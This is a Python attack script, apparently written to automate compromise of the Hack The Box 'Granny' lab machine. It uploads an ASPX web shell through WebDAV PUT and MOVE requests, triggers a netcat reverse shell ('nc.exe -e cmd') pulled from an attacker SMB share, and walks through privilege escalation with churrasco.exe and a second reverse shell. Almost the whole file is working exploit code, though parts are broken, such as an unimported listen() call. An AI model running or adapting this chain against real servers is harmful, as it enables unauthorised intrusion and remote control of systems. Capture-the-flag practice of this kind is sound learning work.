import sys, os, requests, re, subprocess, paramiko,threading
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder
from ftplib import FTP

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Granny
    __________________________________________________________________________\n"""
    print(Fore.LIGHTMAGENTA_EX + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] iips_user","[+] Administrator", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.15" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit ] > " + Fore.YELLOW + f"SMB {target_machine}");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Granny Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

#------------------------------------------------------------------------
malicious_files = ["cmdasp.aspx", "nc.exe"]
main_url = f"http://{target_machine}/cmdasp.aspx"
lport = 443

def makeRequest():
    s = requests.Session()
    # print(f"[INFO] Enviando petición a {main_url}...")
    r = s.get(main_url)
    
    if r.status_code != 200:
        print(f"[ERROR] La respuesta no es 200. Código: {r.status_code}")
        return

    viewstate_value = re.findall(r'"__VIEWSTATE" value="(.*?)"', r.text)[0]
    # eventvalidation_value = re.findall(r'"__EVENTVALIDATION" value="(.*?)"', r.text)[0]

    post_data = {
        '__VIEWSTATE': f'{viewstate_value}',
        # '__EVENTVALIDATION': f'{eventvalidation_value}',
        'txtArg': f'//{machine_ip}/smbFolder/nc.exe -e cmd {machine_ip} 443', 
        'testing': 'excute', 
    }

    # print(f"[INFO] Enviando datos: {post_data}")
    r = s.post(main_url, data=post_data)
    
    if r.status_code == 200:
        print(f"[INFO] Respuesta: {r.text}")
    else:
        print(f"[ERROR] Error al enviar la petición. Código de respuesta: {r.status_code}")

def enter_iis_web():
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        print(str(e))
    
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()


def iis_user_default():
    commands_send("cp /usr/share/webshells/aspx/cmdasp.aspx .")
    commands_send("cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .")
    commands_send(f"curl -s -X PUT http://{target_machine}/cmdasp.txt -d @cmdasp.aspx") # add
    commands_send(f'curl -s -X MOVE -H "Destination:http://{target_machine}/cmdasp.aspx" http://{target_machine}/cmdasp.txt') # chg
    print(tmsg,Fore.RED + f"[Exploit - iis_user] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "sudo impacket-smbserver smbFolder $(pwd) -smb2support");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - iis_user] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + "sudo nc -nlvp 443");cm.sleep(.5)
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [iis_user] > " + Fore.WHITE + f"Press ENTER to continue...")
    enter_iis_web()

def administrator_user_content():
    commands_send("cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .");cm.sleep(1)
    commands_send("wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe");cm.sleep(2)
    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + "cd C:\Windows\Temp");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + f"copy \\{machine_ip}\smbFolder\churrasco.exe");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Linux > " + Fore.LIGHTCYAN_EX + "sudo nc -nlvp 443");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + f'.\churrasco.exe "\\{machine_ip}\smbFolder\\nc.exe -e cmd 10.10.16.8 443"');cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - administrator-user] > " + Fore.YELLOW + f"Run command Windows > " + Fore.LIGHTCYAN_EX + f"copy \\{machine_ip}\smbFolder\\nc.exe");cm.sleep(.5)
    commands_send("sudo impacket-smbserver smbFolder $(pwd)")

#------------------------------------------------------------------------
def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","iis-user connection"))
                iis_user_default()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[iis-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","Administrator user connection"))
                administrator_user_content()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[Administrator-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
